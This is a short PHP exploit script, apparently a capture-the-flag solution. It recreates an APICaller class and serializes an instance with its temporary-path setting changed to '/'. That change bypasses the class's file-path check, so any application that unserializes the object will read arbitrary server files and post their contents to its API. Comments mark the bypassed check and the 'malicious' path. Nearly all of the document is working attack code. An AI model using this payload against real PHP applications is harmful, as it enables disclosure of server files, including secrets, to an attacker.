<?php
// apicaller.php (the class definition you provided)
class APICaller {
    private $url =  'http://localhost/api/';
    private $path_tmp = '/tmp/'; // We want to override this
    private $id;

    public function __construct($id, $path_tmp = '/tmp/') {
        $this->id = $id;
        $this->path_tmp = $path_tmp;
    }

    public function __call($apiMethod, $data = array()) {
        $url = $this->url . $apiMethod;
        $data['id'] = $this->id;

        foreach ($data as $k => &$v) {
            if ( ($v) && (is_string($v)) && str_starts_with($v, '@') ) {
                $file = substr($v, 1);

                if ( str_starts_with($file, $this->path_tmp) ) { // This is the check we bypass
                    $v = file_get_contents($file);
                }
            }
            if (is_array($v) || is_object($v)) {
                $v = json_encode($v);
            }
        }

        $ch = curl_init($url);
        curl_setopt_array($ch, array(
            CURLOPT_POST         => true,
            CURLOPT_POSTFIELDS   => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER   => array('Accept: application/json'),
        ));
        $response = curl_exec($ch);
        $error  = curl_error($ch);
        curl_close($ch);

        if (!empty($error)) {
            throw new Exception($error);
        }
        return $response;
    }
}

// Create an instance of the APICaller class with our desired path_tmp
$malicious_path = '/'; // Or '.' for current directory, '..' for parent, etc.
$obj = new APICaller('arbitrary_id', $malicious_path);

// Serialize the object
$serialized_obj = serialize($obj);
echo $serialized_obj;
?>